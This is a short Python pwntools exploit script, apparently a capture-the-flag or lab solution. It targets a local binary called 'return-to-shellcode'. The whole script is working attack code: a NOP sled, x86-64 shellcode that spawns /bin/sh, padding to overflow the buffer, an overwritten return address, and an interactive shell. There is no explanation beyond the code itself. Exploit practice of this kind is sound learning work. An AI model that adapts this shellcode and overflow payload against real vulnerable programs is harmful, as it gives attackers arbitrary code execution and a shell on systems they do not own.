from pwn import *

p = process('./return-to-shellcode')

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

pay = b'\x90' * 8
pay += shellcode
pay += b'a' * (0x48 - len(pay))
pay += p64(0x7fffffffe3b8)

p.recvuntil(b': ')
p.send(pay)

p.interactive()